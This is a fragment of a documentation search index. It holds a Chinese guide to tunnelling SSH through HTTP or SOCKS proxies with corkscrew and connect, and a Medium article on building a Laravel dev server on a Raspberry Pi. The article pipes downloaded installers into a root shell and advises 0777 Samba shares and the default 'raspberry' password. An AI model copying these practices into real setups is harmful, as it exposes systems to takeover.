\u5148\u6765\u4ecb\u7ecd\u4e00\u4e0bCorkscrew\uff0c\u9996\u5148\u5f3a\u8c03\u7684\u662f\u5b83\u53ea\u80fd\u4f7f\u7528http\u4ee3\u7406\uff0c\u6211\u8bd5\u4e86\u5f88\u957f\u65f6\u95f4\uff0c\u53d1\u73b0\u4e0d\u6210\u529f\uff0c\u5176\u539f\u56e0\u5c31\u662f\u6a21\u62df\u7684\u4ee3\u7406\u4e0d\u662fhttp\u4ee3\u7406\uff0c\u81f3\u4e8ehttp\u4ee3\u7406\u7f51\u4e0a\u6709\u5f88\u591a\uff0c\u5927\u5bb6\u53ef\u4ee5\u76f4\u63a5\u641c\u7d22\u540e\u62ff\u6765\u4f7f\u7528\u3002 \u90a3\u4e48\u5982\u4f55\u6765\u4f7f\u7528\u5b83\uff1a 1.\u89e3\u538b\u5e76\u7f16\u8bd1\u5b89\u88c5\uff1a wget http://www.agroman.net/corkscrew/corkscrew-2.0.tar.gztar -xzvf corkscrew-2.0.tar.gz # [..] cd corkscrew ./configure make install 2.\u6dfb\u52a0\u914d\u7f6e\u5230ssh\u7528\u6237\u76ee\u5f55\uff0c$HOME/.ssh/config (\u7f16\u8f91\u8be5\u914d\u7f6e\u6587\u4ef6)\u5199\u5165\uff1a Host * ProxyCommand corkscrew http-proxy.example.com 8080 %h %p \u6ce8\u610fhttp-proxy.example.com\u4e3ahttp\u4ee3\u7406\u5730\u5740\u6839\u636e\u5b9e\u9645\u66f4\u6539\uff0c\u540e\u9762\u76848080\u4e3ahttp \u4ee3\u7406 \u7aef\u53e3\u3002\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fde\u63a5\u4e86\uff1a ssh root@ssh.malu.me -p 22 \u6bd4\u5982\u4ee5\u4e0a\u662f\u964b\u5ba4\u535a\u5ba2\u6f14\u793a\u7684\u767b\u5f55\u670d\u52a1\u5668\uff0c\u5728\u7b2c\u4e8c\u6b21\u767b\u5f55\u65f6\u5c31\u53ef\u770b\u5230\u4e0a\u6b21\u767b\u5f55ip\uff0c\u4ece\u800c\u5224\u65ad\u662f\u5426\u662f\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5\u4e86\u3002 \u63a5\u4e0b\u6765\u4ecb\u7ecdconnect\uff0c\u8be5\u7a0b\u5e8f\u5b98\u65b9\u63d0\u4f9b\u7684\u662fc\u6e90\u6587\u4ef6\uff0c\u4e0b\u8f7d\u4e0b\u6765\u540e\u9700\u8981\u7f16\u8bd1\uff1a 1.\u4e0b\u8f7d\u5e76gcc\u7f16\u8bd1\uff1a wget http://www.meadowy.org/~gotoh/ssh/connect.c gcc connect.c -o connect cp connect /usr/local/bin 2.\u6dfb\u52a0\u914d\u7f6e\u5230ssh\u7528\u6237\u76ee\u5f55\uff0c$HOME/.ssh/config (\u7f16\u8f91\u8be5\u914d\u7f6e\u6587\u4ef6)\u5199\u5165\uff1a ## Outside of the firewall, with HTTP proxy Host * ProxyCommand connect -H proxy.local.net:8080 %h %p \u4ee5\u4e0a\u662f\u900f\u8fc7http\u4ee3\u7406\uff0c\u5982\u679c\u662fsocks\u4ee3\u7406\u5219\u628a-H\u6539\u4e3a-S\uff1a ## Outside of the firewall, use connect command with SOCKS conenction. Host * ProxyCommand connect -S socks.local.net %h %p \u4ee5\u4e0a\u914d\u7f6e\u5c31\u5b8c\u6210\u4e86\uff0c\u6ce8\u610fsocks.local.net\u540c\u6837\u662f\u9700\u8981\u7528\u81ea\u5df1\u7684socks\u4ee3\u7406\u670d\u52a1\u5668\u66ff\u6362\u7684\uff0c\u5728\u7aef\u53e3\u914d\u7f6e\u4e0a\u662f\u52a0\u201c\uff1a\u7aef\u53e3\u53f7\u201d\u6765\u89e3\u51b3\u4e0eCorkscrew\u7684\u914d\u7f6e\u4e0d\u540c\u3002 \u5982\u679c\u662fWindows\u4e0b\u4f7f\u7528 cygwin \u7684\u7528\u6237\uff0c\u53ef\u4ee5\u76f4\u63a5\u4e0b\u8f7d connect.exe \uff0c\u653e\u5728c:\\window\\\u76ee\u5f55\u4e0b\uff0c\u7136\u540e\u540c\u6837\u7684\u5728$HOME/.ssh/config\u5199\u5165\u76f8\u5e94\u914d\u7f6e\u3002 \u4ee5\u4e0a\u9700\u8981\u7528\u5230\u7684\u6587\u4ef6\u5907\u4efd\u5728\u964b\u5ba4\u535a\u5ba2-\u4e0b\u8f7d-\u6e90\u4ee3\u7801\u91cc\uff1a http://bolg.malu.me/down \u539f\u6587\u94fe\u63a5\uff1a http://bolg.malu.me/html/2011/1809.html","title":"SSH\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5"},{"location":"RPI/SSH%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5/#ssh","text":"\u4ece\u76ee\u524d\u7f51\u4e0a\u7684\u8d44\u6599\u6765\u770b\uff0c\u901a\u8fc7\u4ee3\u7406\u6765\u8fde\u63a5 ssh \u67092\u79cd\u65b9\u5f0f\uff1a \u4e00\u79cd\u662f\u7528Corkscrew\u5b9e\u73b0http\u4ee3\u7406\u96a7\u9053\u8fde\u63a5\uff0c corkscrew\u5b98\u65b9\u4e3b\u9875 \uff1b \u53e6\u5916\u4e00\u79cd\u662f\u5229\u7528connect\u80fd\u5b9e\u73b0Sock5\u548chttp\u4ee3\u7406\u96a7\u9053\u8fde\u63a5\uff0c connect\u5b98\u65b9\u4e3b\u9875 \uff08connect\u9879\u76ee\u73b0\u5df2\u64a4\u51fa\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u8bf7\u770b\uff1a \u70b9\u8fd9\u91cc \uff09\u3002 \u5148\u6765\u4ecb\u7ecd\u4e00\u4e0bCorkscrew\uff0c\u9996\u5148\u5f3a\u8c03\u7684\u662f\u5b83\u53ea\u80fd\u4f7f\u7528http\u4ee3\u7406\uff0c\u6211\u8bd5\u4e86\u5f88\u957f\u65f6\u95f4\uff0c\u53d1\u73b0\u4e0d\u6210\u529f\uff0c\u5176\u539f\u56e0\u5c31\u662f\u6a21\u62df\u7684\u4ee3\u7406\u4e0d\u662fhttp\u4ee3\u7406\uff0c\u81f3\u4e8ehttp\u4ee3\u7406\u7f51\u4e0a\u6709\u5f88\u591a\uff0c\u5927\u5bb6\u53ef\u4ee5\u76f4\u63a5\u641c\u7d22\u540e\u62ff\u6765\u4f7f\u7528\u3002 \u90a3\u4e48\u5982\u4f55\u6765\u4f7f\u7528\u5b83\uff1a 1.\u89e3\u538b\u5e76\u7f16\u8bd1\u5b89\u88c5\uff1a wget http://www.agroman.net/corkscrew/corkscrew-2.0.tar.gztar -xzvf corkscrew-2.0.tar.gz # [..] cd corkscrew ./configure make install 2.\u6dfb\u52a0\u914d\u7f6e\u5230ssh\u7528\u6237\u76ee\u5f55\uff0c$HOME/.ssh/config (\u7f16\u8f91\u8be5\u914d\u7f6e\u6587\u4ef6)\u5199\u5165\uff1a Host * ProxyCommand corkscrew http-proxy.example.com 8080 %h %p \u6ce8\u610fhttp-proxy.example.com\u4e3ahttp\u4ee3\u7406\u5730\u5740\u6839\u636e\u5b9e\u9645\u66f4\u6539\uff0c\u540e\u9762\u76848080\u4e3ahttp \u4ee3\u7406 \u7aef\u53e3\u3002\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fde\u63a5\u4e86\uff1a ssh root@ssh.malu.me -p 22 \u6bd4\u5982\u4ee5\u4e0a\u662f\u964b\u5ba4\u535a\u5ba2\u6f14\u793a\u7684\u767b\u5f55\u670d\u52a1\u5668\uff0c\u5728\u7b2c\u4e8c\u6b21\u767b\u5f55\u65f6\u5c31\u53ef\u770b\u5230\u4e0a\u6b21\u767b\u5f55ip\uff0c\u4ece\u800c\u5224\u65ad\u662f\u5426\u662f\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5\u4e86\u3002 \u63a5\u4e0b\u6765\u4ecb\u7ecdconnect\uff0c\u8be5\u7a0b\u5e8f\u5b98\u65b9\u63d0\u4f9b\u7684\u662fc\u6e90\u6587\u4ef6\uff0c\u4e0b\u8f7d\u4e0b\u6765\u540e\u9700\u8981\u7f16\u8bd1\uff1a 1.\u4e0b\u8f7d\u5e76gcc\u7f16\u8bd1\uff1a wget http://www.meadowy.org/~gotoh/ssh/connect.c gcc connect.c -o connect cp connect /usr/local/bin 2.\u6dfb\u52a0\u914d\u7f6e\u5230ssh\u7528\u6237\u76ee\u5f55\uff0c$HOME/.ssh/config (\u7f16\u8f91\u8be5\u914d\u7f6e\u6587\u4ef6)\u5199\u5165\uff1a ## Outside of the firewall, with HTTP proxy Host * ProxyCommand connect -H proxy.local.net:8080 %h %p \u4ee5\u4e0a\u662f\u900f\u8fc7http\u4ee3\u7406\uff0c\u5982\u679c\u662fsocks\u4ee3\u7406\u5219\u628a-H\u6539\u4e3a-S\uff1a ## Outside of the firewall, use connect command with SOCKS conenction. Host * ProxyCommand connect -S socks.local.net %h %p \u4ee5\u4e0a\u914d\u7f6e\u5c31\u5b8c\u6210\u4e86\uff0c\u6ce8\u610fsocks.local.net\u540c\u6837\u662f\u9700\u8981\u7528\u81ea\u5df1\u7684socks\u4ee3\u7406\u670d\u52a1\u5668\u66ff\u6362\u7684\uff0c\u5728\u7aef\u53e3\u914d\u7f6e\u4e0a\u662f\u52a0\u201c\uff1a\u7aef\u53e3\u53f7\u201d\u6765\u89e3\u51b3\u4e0eCorkscrew\u7684\u914d\u7f6e\u4e0d\u540c\u3002 \u5982\u679c\u662fWindows\u4e0b\u4f7f\u7528 cygwin \u7684\u7528\u6237\uff0c\u53ef\u4ee5\u76f4\u63a5\u4e0b\u8f7d connect.exe \uff0c\u653e\u5728c:\\window\\\u76ee\u5f55\u4e0b\uff0c\u7136\u540e\u540c\u6837\u7684\u5728$HOME/.ssh/config\u5199\u5165\u76f8\u5e94\u914d\u7f6e\u3002 \u4ee5\u4e0a\u9700\u8981\u7528\u5230\u7684\u6587\u4ef6\u5907\u4efd\u5728\u964b\u5ba4\u535a\u5ba2-\u4e0b\u8f7d-\u6e90\u4ee3\u7801\u91cc\uff1a http://bolg.malu.me/down \u539f\u6587\u94fe\u63a5\uff1a http://bolg.malu.me/html/2011/1809.html","title":"SSH\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/","text":"Using Raspberry Pi for Laravel developing | by Ronie Meque | Medium Using Raspberry Pi for Laravel developing This article can be viewed in portuguese here . If you are a Laravel developer and can\u2019t afford a Mac or can\u2019t migrate definitely for Linux distro because it lacks an app (Photoshop in my case), chances are high that you already got a bit frustatred in doing so in a Windows. If you also use Laravel Mix for some assets managing, like babel and sass , you have probabably got really frustrated at a point. It doesn\u2019t matter how powerfull your Windows rig is, it\u2019s going to be slow \u2014 mainly doing Composer install or handling Node.js. There are a few options out there though: Git Bash. It is possible to run everything you would do in a Linux distro inside the Git Bash shell that comes with Git for Windows, and it works really nice! Until then, this was my favorite method. Homestead. Homestead is a nice little Ubuntu Vagrant box packed with everything you might need to do some Laravel developing, but according to personal experience and community feedback, it kinda sucks in Windows, in matters of speed mainly. A dedicated Linux for the job. This is the case we will cover here, more specifically using a Raspberry Pi (It\u2019s very cheap). If you have an old computer lying around it is probably worth a try either! Anyway, what we want: A Raspberry Pi device running a Laravel 5.5 application with PHP\u2019s built-in server, automatically compiling frontend assets with Laravel Mix and serving all through the local network. We also want the project\u2019s folder to be easily accessible through our local network, making it feel like we are editing the files from Windows inside our Raspberry Pi. Requirements: Raspberry Pi 3 (it will probably work on older models too though) Local network Lastest Raspbian (currently Stretch) A decent command line in Windows. What I recommend: Git Bash alongside the Cmder or Hyper emulators. If you can\u2019t or don\u2019t want to use Git Bash, Cmder includes Clink which provides a few usefull Unix commands in Window\u2019s command line. Basic Raspberry Pi setup (OPTIONAL) Let\u2019s configure remote access to the Pi, expand the filesystem and disable the GUI. Remote access With a keyboard and screen conected to your Pi (soon you won\u2019t need them anymore) Enter sudo raspi-config in the CLI. Choose Interfacing Options and after SSH Pick yes and close the menu Now execute hostname -I to find out what is your Pi\u2019s local IP. Back to the computer, we can now access the Pi with ssh pi@YOUR-PI-IP Example: ssh pi@192.168.1.38 The default password is \u201craspberry\u201d. It\u2019s likelly that in the first connection you will have to type yes to confirm you trust the host. Let\u2019s configure a key so we won\u2019t need to type the password again. If you don\u2019t have a key on your PC, generate one using ssh-keygen -t rsa and confirm all the questions with an enter. The key will be stored in a .ssh folder in your home folder inside two files: id_rsa and id_rsa.pub . Back to your PC now execute ssh-copy-id -i path/to/id_rsa.pub pi@YOUR-PI-IP Example: ssh-copy-id -i ~/.ssh/id_rsa.pub pi@192.168.1.38 Type the password for the last time and it\u2019s done! \ud83d\ude2e Disabling the GUI and expanding the filesystem Since we will do all the work in the remote CLI, the GUI and keyboard are no longer needed. We will also expand the filesystem to use the whole SD Card (Raspbian doesn\u2019t do that by default). In your remote CLI type sudo raspi-config Navigate to Boot options , then Desktop / CLI and select Console Back to the main menu, go to Advanced Options and then Expand Filesystem. When requested, reboot your Pi. Sharing the Raspberry files across your local network Depending on a FTP, SFTP and such here would just blow away all the fun, so let\u2019s setup a folder sharing from your Pi to your Windows. After this, you will be able to open your project\u2019s folder in your editor or IDE naturally like it was inside Windows. In your Pi, do the following: sudo apt install samba samba-common-bin -y sudo vim /etc/samba/smb.conf (Replace vim with any CLI editor you like or simply install vim with sudo apt install vim -y ) Find the following lines and edit them like follows: (The workgroup name can be anything alphanumeric) workgroup = nicetidygroupy wins support = yes * Add this at the end of the file (In this case we are sharing the whole home folder from the Pi user): [pihome] comment= Pi Home path=/home/pi browseable=Yes writeable=Yes only guest=no create mask=0777 directory mask=0777 public=no * Save smb.conf file and do configure the sharing login with smbpasswd -a pi (Since this a local development server, I recommend using the same password from the Pi user \u2014 by default \u201craspberry\u201d) * Restart samba so we can be sure everything will be ok: sudo /etc/init.d/samba restart If everything went well, it\u2019s likelly your Pi will now appear in your Windows network tab. When asked for a password, use the login \u201cpi\u201d alongside the password you defined in the last step. Sharing Pi\u2019s home to WindowsIf your devices are connected through cable, the experience here will be just perfect, but it works really well in Wi-Fi too. Installing PHP 7.0 and Composer on Raspberry Pi In order to install PHP 7.0 and some of Laravel\u2019s mandatory and opcional dependencies, execute the following: sudo apt install php7.0 php7.0-curl php7.0-gd php7.0-imap php7.0-json php7.0-mcrypt php7.0-mysql php7.0-opcache php7.0-xmlrpc php7.0-xml php7.0-fpm php7.0-zip -y Check if everything is ok by doing php -v . The output should be something like: It works! Installing Composer Now that we have PHP, do the following to install Composer: $ curl -sS https://getcomposer.org/installer | php$ sudo mv composer.phar /usr/local/bin/composer Check if went well with composer --version \ud83c\udd92 Installing MariaDB (mysql) on Raspberry Pi MariaDB is and open source alternative to Oracle\u2019s MySQL. In order to install it, execute: sudo apt install mariadb-server mariadb-client -y Once again check if everything worked with mysql --version : \ud83c\udf7b After installed you can access it with sudo mysql -u root -p . Considering we are setting up a development only environment here, let\u2019s make things easier by creating a new user and giving it full access to MariaDB. This will discard the need to sudo in MariaDB. Execute sudo mysql -u root -p to access MariaDB and then do the following queries, replacing what is in bold with what you prefer. CREATE USER '**user**'@'localhost' IDENTIFIED BY '**pass**';GRANT ALL PRIVILEGES ON * . * TO '**user**'@'localhost';FLUSH PRIVILEGES; After that you can access MariaDB by simply doing mysql -u **usuario** -p . You can also use these credentials in your application. Installing Node.js on Raspberry Pi (OPTIONAL) If you do assets compiling in your project, you will likely need to configure Node.js. Raspbian\u2019s current version comes with Node.js 4. by default, which doesn\u2019t work nice with most of Laravel Mix dependencies, for example. Instead, let\u2019s configure the 8. version. Execute the following: $ curl -sL <https://deb.nodesource.com/setup_8.x> | sudo -E bash -$ sudo apt install nodejs Check if everything is ok with node -v Creating a new Laravel app on Raspberry Pi With all the system dependecies set, let\u2019s create a new project. In case you are cloning an existing one, head down to the bottom of this section. Create a new folder to hold our projects with mkdir ~/projects and access it with cd ~/projects Execute the following to create a new project based on Laravel\u2019s default skeleton: composer create-project --prefer-dist laravel/laravel the-coolest-project-name Everything should run fine and the project will be created! If composer complains that something is missing, try searching the package\u2019s name and installing it with sudo apt install . In this step Composer already installed all of Laravel\u2019s backend dependencies. Cloning an existing project In case the project already exists, acess the projects folder created in the last step and do the following: Clone your project using git. Example: git clone git@github.com:roniemeque/nice-little-app.git acess the created folder with cd nice-little-app and install all of Laravel\u2019s backend dependencies with composer install configure your .env file, generate the app\u2019s key, run your migrations and the usual Laravel setup. Installing the dependencies for assets manipulation with NPM If you use some kind of compilling, polifylling, minification and such and you have installed Node.js in your Pi, now it\u2019s time to install the project\u2019s dependencies. Whether it\u2019s a new or existing app, execute npm install in its folder. Important detail: the output of npm\u2019s installs in Raspbian is a lot more verbose and slower than the usual, but don\u2019t worry because after everything is installed it will work like it should, depending on your project depencies, of course. Laravel Mix\u2019s dependencies run perfectly in here so far! Now that everything is working, let\u2019s head to the final steps: Running Laravel on Raspberry Pi with PHP\u2019s built-in server Let\u2019s use artisan to manage the server. Execute the following: php artisan serve --host=YOUR-PI-IP (If you can\u2019t remember the IP of your Pi, use hostname -I to see it). Get ready now, it\u2019s coming! In your PC, browse to http://YOUR-PI-IP:8000 and see the result. Example: http://192.168.1.38:8000 Automatically manipulating frontend assets with Laravel Mix on Raspberry Pi If you don\u2019t use Laravel Mix , oh boy you should. It\u2019s an excellent wrapper around Webpack that makes working with Webpack seems like a breeze. You can even use it in non-laravel projects! Access your Pi in a new console tab without closing the one running the server and execute npm run dev inside your project\u2019s folder. If all of your Sass, Less, Coffe, Typescript and etcetera compiled correctly, let\u2019s set the compiling to happen automatically everytime a file is saved with npm run watch . Note on Browsersync If you use Browsersync alongside your Laravel Mix, you can still use it here, but not directly, of course. Configure your Browsersync so it won\u2019t open any browser by default and you will be able to use it by browsing to the remote host Browsersync provides. (It will pop-up in the first output from npm run watch ) \u2014 your online option must be set to true also, but in Laravel Mix it is set by default. If you would like to disable Browsersync at all everytime you use your Pi for developing but you don\u2019t want to keep changing the webpack.mix.js settings and discarding it everytime, Laravel provides a nice way to solve this: In your .env file, add something like this: MIX_BROWSERSYNC=false Now change your Browsersync call inside you webpack.mix.js file so it is surrounded by the following condition: if(process.env.MIX_BROWSERSYNC){ mix.browserSync({your options go here}); } With that you can tell Laravel Mix that you don\u2019t want Browsersync in this environment. Don\u2019t forget to set it to true in the environments you want it enabled. And that\u2019s it At this point you probably have a very decent and fine development environment on your Pi. It is also portable! Don\u2019t forget to always check your IP and network settings in case you plan on carrying it around though. It\u2019s likelly there are tons of ways to accomplish this procedure and it\u2019s possible by the time you read this some things will be outdated. It\u2019s very important to always pay attention to the names of the packages you are installing and the output of the commands you run. If you are doing this it\u2019s quite probable you are used to being frustrated with broken packages or doing a lot of Google to fix tiny hidden errors that will only happen in your system. I really hope this post will help anyone that tries to accomplish a similar result in using the Raspberry Pi as a development server, regardless of your PHP framework, versions and project requirements. \u539f\u6587\u94fe\u63a5\uff1a https://medium.com/@roniemeque/using-raspberry-pi-for-laravel-developing-30dabcdeba43","title":"Using Raspberry Pi for Laravel developing"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#using-raspberry-pi-for-laravel-developing-by-ronie-meque-medium","text":"","title":"Using Raspberry Pi for Laravel developing | by Ronie Meque | Medium"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#using-raspberry-pi-for-laravel-developing","text":"This article can be viewed in portuguese here . If you are a Laravel developer and can\u2019t afford a Mac or can\u2019t migrate definitely for Linux distro because it lacks an app (Photoshop in my case), chances are high that you already got a bit frustatred in doing so in a Windows. If you also use Laravel Mix for some assets managing, like babel and sass , you have probabably got really frustrated at a point. It doesn\u2019t matter how powerfull your Windows rig is, it\u2019s going to be slow \u2014 mainly doing Composer install or handling Node.js. There are a few options out there though: Git Bash. It is possible to run everything you would do in a Linux distro inside the Git Bash shell that comes with Git for Windows, and it works really nice! Until then, this was my favorite method. Homestead. Homestead is a nice little Ubuntu Vagrant box packed with everything you might need to do some Laravel developing, but according to personal experience and community feedback, it kinda sucks in Windows, in matters of speed mainly. A dedicated Linux for the job. This is the case we will cover here, more specifically using a Raspberry Pi (It\u2019s very cheap). If you have an old computer lying around it is probably worth a try either! Anyway, what we want: A Raspberry Pi device running a Laravel 5.5 application with PHP\u2019s built-in server, automatically compiling frontend assets with Laravel Mix and serving all through the local network. We also want the project\u2019s folder to be easily accessible through our local network, making it feel like we are editing the files from Windows inside our Raspberry Pi.","title":"Using Raspberry Pi for Laravel developing"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#requirements","text":"Raspberry Pi 3 (it will probably work on older models too though) Local network Lastest Raspbian (currently Stretch) A decent command line in Windows. What I recommend: Git Bash alongside the Cmder or Hyper emulators. If you can\u2019t or don\u2019t want to use Git Bash, Cmder includes Clink which provides a few usefull Unix commands in Window\u2019s command line.","title":"Requirements:"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#basic-raspberry-pi-setup-optional","text":"Let\u2019s configure remote access to the Pi, expand the filesystem and disable the GUI.","title":"Basic Raspberry Pi setup (OPTIONAL)"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#remote-access","text":"With a keyboard and screen conected to your Pi (soon you won\u2019t need them anymore) Enter sudo raspi-config in the CLI. Choose Interfacing Options and after SSH Pick yes and close the menu Now execute hostname -I to find out what is your Pi\u2019s local IP. Back to the computer, we can now access the Pi with ssh pi@YOUR-PI-IP Example: ssh pi@192.168.1.38 The default password is \u201craspberry\u201d. It\u2019s likelly that in the first connection you will have to type yes to confirm you trust the host. Let\u2019s configure a key so we won\u2019t need to type the password again. If you don\u2019t have a key on your PC, generate one using ssh-keygen -t rsa and confirm all the questions with an enter. The key will be stored in a .ssh folder in your home folder inside two files: id_rsa and id_rsa.pub . Back to your PC now execute ssh-copy-id -i path/to/id_rsa.pub pi@YOUR-PI-IP Example: ssh-copy-id -i ~/.ssh/id_rsa.pub pi@192.168.1.38 Type the password for the last time and it\u2019s done! \ud83d\ude2e","title":"Remote access"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#disabling-the-gui-and-expanding-the-filesystem","text":"Since we will do all the work in the remote CLI, the GUI and keyboard are no longer needed. We will also expand the filesystem to use the whole SD Card (Raspbian doesn\u2019t do that by default). In your remote CLI type sudo raspi-config Navigate to Boot options , then Desktop / CLI and select Console Back to the main menu, go to Advanced Options and then Expand Filesystem. When requested, reboot your Pi.","title":"Disabling the GUI and expanding the filesystem"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#sharing-the-raspberry-files-across-your-local-network","text":"Depending on a FTP, SFTP and such here would just blow away all the fun, so let\u2019s setup a folder sharing from your Pi to your Windows. After this, you will be able to open your project\u2019s folder in your editor or IDE naturally like it was inside Windows. In your Pi, do the following: sudo apt install samba samba-common-bin -y sudo vim /etc/samba/smb.conf (Replace vim with any CLI editor you like or simply install vim with sudo apt install vim -y ) Find the following lines and edit them like follows: (The workgroup name can be anything alphanumeric) workgroup = nicetidygroupy wins support = yes * Add this at the end of the file (In this case we are sharing the whole home folder from the Pi user): [pihome] comment= Pi Home path=/home/pi browseable=Yes writeable=Yes only guest=no create mask=0777 directory mask=0777 public=no * Save smb.conf file and do configure the sharing login with smbpasswd -a pi (Since this a local development server, I recommend using the same password from the Pi user \u2014 by default \u201craspberry\u201d) * Restart samba so we can be sure everything will be ok: sudo /etc/init.d/samba restart If everything went well, it\u2019s likelly your Pi will now appear in your Windows network tab. When asked for a password, use the login \u201cpi\u201d alongside the password you defined in the last step. Sharing Pi\u2019s home to WindowsIf your devices are connected through cable, the experience here will be just perfect, but it works really well in Wi-Fi too.","title":"Sharing the Raspberry files across your local network"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#installing-php-70-and-composer-on-raspberry-pi","text":"In order to install PHP 7.0 and some of Laravel\u2019s mandatory and opcional dependencies, execute the following: sudo apt install php7.0 php7.0-curl php7.0-gd php7.0-imap php7.0-json php7.0-mcrypt php7.0-mysql php7.0-opcache php7.0-xmlrpc php7.0-xml php7.0-fpm php7.0-zip -y Check if everything is ok by doing php -v . The output should be something like: It works!","title":"Installing PHP 7.0 and Composer on Raspberry Pi"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#installing-composer","text":"Now that we have PHP, do the following to install Composer: $ curl -sS https://getcomposer.org/installer | php$ sudo mv composer.phar /usr/local/bin/composer Check if went well with composer --version \ud83c\udd92","title":"Installing Composer"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#installing-mariadb-mysql-on-raspberry-pi","text":"MariaDB is and open source alternative to Oracle\u2019s MySQL. In order to install it, execute: sudo apt install mariadb-server mariadb-client -y Once again check if everything worked with mysql --version : \ud83c\udf7b After installed you can access it with sudo mysql -u root -p . Considering we are setting up a development only environment here, let\u2019s make things easier by creating a new user and giving it full access to MariaDB. This will discard the need to sudo in MariaDB. Execute sudo mysql -u root -p to access MariaDB and then do the following queries, replacing what is in bold with what you prefer. CREATE USER '**user**'@'localhost' IDENTIFIED BY '**pass**';GRANT ALL PRIVILEGES ON * . * TO '**user**'@'localhost';FLUSH PRIVILEGES; After that you can access MariaDB by simply doing mysql -u **usuario** -p . You can also use these credentials in your application.","title":"Installing MariaDB (mysql) on Raspberry Pi"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#installing-nodejs-on-raspberry-pi-optional","text":"If you do assets compiling in your project, you will likely need to configure Node.js. Raspbian\u2019s current version comes with Node.js 4. by default, which doesn\u2019t work nice with most of Laravel Mix dependencies, for example. Instead, let\u2019s configure the 8. version. Execute the following: $ curl -sL <https://deb.nodesource.com/setup_8.x> | sudo -E bash -$ sudo apt install nodejs Check if everything is ok with node -v","title":"Installing Node.js on Raspberry Pi (OPTIONAL)"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#creating-a-new-laravel-app-on-raspberry-pi","text":"With all the system dependecies set, let\u2019s create a new project. In case you are cloning an existing one, head down to the bottom of this section. Create a new folder to hold our projects with mkdir ~/projects and access it with cd ~/projects Execute the following to create a new project based on Laravel\u2019s default skeleton: composer create-project --prefer-dist laravel/laravel the-coolest-project-name Everything should run fine and the project will be created! If composer complains that something is missing, try searching the package\u2019s name and installing it with sudo apt install . In this step Composer already installed all of Laravel\u2019s backend dependencies.","title":"Creating a new Laravel app on Raspberry Pi"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#cloning-an-existing-project","text":"In case the project already exists, acess the projects folder created in the last step and do the following: Clone your project using git. Example: git clone git@github.com:roniemeque/nice-little-app.git acess the created folder with cd nice-little-app and install all of Laravel\u2019s backend dependencies with composer install configure your .env file, generate the app\u2019s key, run your migrations and the usual Laravel setup.","title":"Cloning an existing project"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#installing-the-dependencies-for-assets-manipulation-with-npm","text":"If you use some kind of compilling, polifylling, minification and such and you have installed Node.js in your Pi, now it\u2019s time to install the project\u2019s dependencies. Whether it\u2019s a new or existing app, execute npm install in its folder. Important detail: the output of npm\u2019s installs in Raspbian is a lot more verbose and slower than the usual, but don\u2019t worry because after everything is installed it will work like it should, depending on your project depencies, of course. Laravel Mix\u2019s dependencies run perfectly in here so far! Now that everything is working, let\u2019s head to the final steps:","title":"Installing the dependencies for assets manipulation with NPM"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#running-laravel-on-raspberry-pi-with-phps-built-in-server","text":"Let\u2019s use artisan to manage the server. Execute the following: php artisan serve --host=YOUR-PI-IP (If you can\u2019t remember the IP of your Pi, use hostname -I to see it). Get ready now, it\u2019s coming! In your PC, browse to http://YOUR-PI-IP:8000 and see the result. Example: http://192.168.1.38:8000","title":"Running Laravel on Raspberry Pi with PHP\u2019s built-in server"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#automatically-manipulating-frontend-assets-with-laravel-mix-on-raspberry-pi","text":"If you don\u2019t use Laravel Mix , oh boy you should. It\u2019s an excellent wrapper around Webpack that makes working with Webpack seems like a breeze. You can even use it in non-laravel projects! Access your Pi in a new console tab without closing the one running the server and execute npm run dev inside your project\u2019s folder. If all of your Sass, Less, Coffe, Typescript and etcetera compiled correctly, let\u2019s set the compiling to happen automatically everytime a file is saved with npm run watch .","title":"Automatically manipulating frontend assets with Laravel Mix on Raspberry Pi"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#note-on-browsersync","text":"If you use Browsersync alongside your Laravel Mix, you can still use it here, but not directly, of course. Configure your Browsersync so it won\u2019t open any browser by default and you will be able to use it by browsing to the remote host Browsersync provides. (It will pop-up in the first output from npm run watch ) \u2014 your online option must be set to true also, but in Laravel Mix it is set by default. If you would like to disable Browsersync at all everytime you use your Pi for developing but you don\u2019t want to keep changing the webpack.mix.js settings and discarding it everytime, Laravel provides a nice way to solve this: In your .env file, add something like this: MIX_BROWSERSYNC=false Now change your Browsersync call inside you webpack.mix.js file so it is surrounded by the following condition: if(process.env.MIX_BROWSERSYNC){ mix.browserSync({your options go here}); } With that you can tell Laravel Mix that you don\u2019t want Browsersync in this environment. Don\u2019t forget to set it to true in the environments you want it enabled.","title":"Note on Browsersync"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#and-thats-it","text":"At this point you probably have a very decent and fine development environment on your Pi. It is also portable! Don\u2019t forget to always check your IP and network settings in case you plan on carrying it around though. It\u2019s likelly there are tons of ways to accomplish this procedure and it\u2019s possible by the time you read this some things will be outdated. It\u2019s very important to always pay attention to the names of the 